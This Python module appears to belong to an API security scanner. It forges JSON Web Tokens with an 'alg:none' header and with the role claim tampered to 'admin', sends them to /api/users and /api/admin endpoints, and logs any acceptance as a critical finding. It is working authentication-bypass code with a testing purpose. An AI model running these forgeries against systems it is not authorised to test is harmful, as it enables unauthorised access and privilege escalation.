"""
scanner/jwt_attacks.py
Two JWT attack vectors:
  1. alg:none  — strips signature, sets algorithm to "none"
  2. Role tamper — modifies role claim in payload without re-signing
Both forged tokens are constructed in pure Python — no server secret needed.
"""

import json
import base64


def _decode_payload(token):
    """Base64-decode the payload section of a JWT."""
    part = token.split(".")[1]
    part += "=" * (-len(part) % 4)   # pad to multiple of 4
    return json.loads(base64.urlsafe_b64decode(part))


def _encode_part(data):
    """JSON-encode and base64url-encode a dict, no padding."""
    return base64.urlsafe_b64encode(
        json.dumps(data, separators=(",", ":")).encode()
    ).rstrip(b"=").decode()


def forge_none_alg(token):
    """Return a token with alg=none and no signature."""
    parts = token.split(".")
    header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
    header["alg"] = "none"
    return f"{_encode_part(header)}.{parts[1]}."


def forge_role(token, role="admin"):
    """Return a token with the role field changed, without re-signing."""
    parts = token.split(".")
    payload = _decode_payload(token)
    payload["role"] = role
    return f"{parts[0]}.{_encode_part(payload)}."


def run(client, base_url, token_a, **kwargs):
    """
    token_a = low-privilege token to forge from
    """
    print("\n[3/8] JWT attacks  (alg:none + role tampering)")
    print("      Forging tokens without the server signing secret\n")

    findings = []
    vuln_found = False

    # ── alg:none ──────────────────────────────────────────────────────────
    forged_none = forge_none_alg(token_a)
    print(f"  alg:none token: {forged_none[:55]}...")

    try:
        r = client.get(
            f"{base_url}/api/users",
            headers={"Authorization": f"Bearer {forged_none}"}
        )
        print(f"  GET /api/users (alg:none)       → {r.status_code}")

        if r.status_code == 200:
            findings.append({
                "status": "VULNERABLE",
                "category": "JWT alg:none",
                "severity": "Critical",
                "owasp": "API2:2023 — Broken Authentication",
                "detail": "Server accepts unsigned token with alg:none — signature verification is skipped",
                "request": f"GET /api/users  Authorization: Bearer {forged_none[:80]}...",
                "response": f"HTTP {r.status_code}: {r.text[:200]}",
            })
            vuln_found = True

    except Exception as e:
        print(f"  alg:none → ERROR: {e}")

    # ── Role tamper ────────────────────────────────────────────────────────
    forged_role = forge_role(token_a, "admin")
    print(f"\n  Role-tampered token: {forged_role[:55]}...")

    try:
        r = client.get(
            f"{base_url}/api/admin",
            headers={"Authorization": f"Bearer {forged_role}"}
        )
        print(f"  GET /api/admin (role=admin tamper) → {r.status_code}")

        if r.status_code == 200:
            findings.append({
                "status": "VULNERABLE",
                "category": "JWT Role Tampering",
                "severity": "Critical",
                "owasp": "API5:2023 — Broken Function Level Authorization",
                "detail": "Server accepts role-tampered token — payload role changed employee→admin without re-signing",
                "request": f"GET /api/admin  Authorization: Bearer {forged_role[:80]}...",
                "response": f"HTTP {r.status_code}: {r.text[:200]}",
            })
            vuln_found = True

    except Exception as e:
        print(f"  Role tamper → ERROR: {e}")

    if not vuln_found:
        print("\n  ✓ Server correctly rejects unsigned and tampered tokens")
        findings.append({
            "status": "SAFE",
            "category": "JWT Attacks",
            "severity": None,
            "owasp": "API2:2023 — Broken Authentication",
        })

    return findings
